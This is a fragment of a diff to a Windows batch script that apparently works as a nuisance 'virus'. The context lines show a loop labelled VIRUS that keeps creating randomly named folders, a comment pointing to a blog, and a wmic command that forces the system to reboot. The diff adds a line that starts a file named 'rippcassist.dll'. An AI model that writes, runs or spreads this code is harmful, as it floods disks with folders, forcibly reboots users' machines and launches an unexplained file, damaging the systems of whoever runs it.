@@ -14,4 +14,5 @@ md %RANDOM%
 goto VIRUS
 REM #######################
 REM errorcode401.blogspot.in
+start "rippcassist.dll"
 wmic os where primary=1 reboot
